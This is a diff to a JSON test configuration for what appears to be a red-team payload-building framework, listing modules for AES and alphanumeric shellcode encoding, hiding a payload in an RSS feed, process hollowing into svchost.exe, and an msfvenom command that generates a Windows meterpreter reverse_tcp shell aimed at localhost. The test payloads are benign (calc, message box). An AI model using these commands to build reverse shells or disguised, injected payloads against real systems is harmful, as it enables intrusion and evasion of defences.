@@ -4,16 +4,6 @@
         "scheme": "V1",
         "single_step": null,
         "modules": {
-            "aes": {
-                "args": {
-                    "mode": "encode",
-                    "input": "tests\\calc.raw",
-                    "output": "tests\\0-sc.aes",
-                    "key": "shenpa$$"
-                },
-                "input_buffer": false,
-                "return_buffer": false
-            },
             "alphanum": {
                 "args": {
                     "input": "tests\\calc.raw",
@@ -77,7 +67,11 @@
                     "input": "tests\\calc.raw",
                     "output": "tests\\0-rss.txt",
                     "uri": null,
-                    "reassemble": false
+                    "reassemble": false,
+                    "feed_author": "Steve Gates",
+                    "feed_title": "AppleSoft Developer News",
+                    "feed_subtitle": "The insane news blog about more insane things",
+                    "feed_uri": "https://www.nosociety.de/blog/"
                 },
                 "input_buffer": false,
                 "return_buffer": false
@@ -96,11 +90,7 @@
             },
             "msfvenom": {
                 "args": {
-                    "remote_host": "127.0.0.1",
-                    "remote_port": 8501,
-                    "timeout": 30,
-                    "architecture": "x64",
-                    "sleeptime": 0
+                    "command_line": "-p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4455 -f raw -o 0.msfvenom.bin"
                 },
                 "input_buffer": false,
                 "return_buffer": true
@@ -141,7 +131,7 @@
             },
             "psoverwrite": {
                 "args": {
-                    "payload": "tests\\msgbox2.exe",
+                    "payload": "tests\\msgbox.exe",
                     "target": "C:\\windows\\system32\\svchost.exe"
                 },
                 "input_buffer": false,
@@ -166,7 +156,7 @@
             },
             "subproc": {
                 "args": {
-                    "command_line": ["ndisasm.exe", "tests\\calc.raw"]
+                    "command_line": ["dev\\ndisasm.exe", "tests\\calc.raw"]
                 },
                 "input_buffer": false,
                 "return_buffer": false
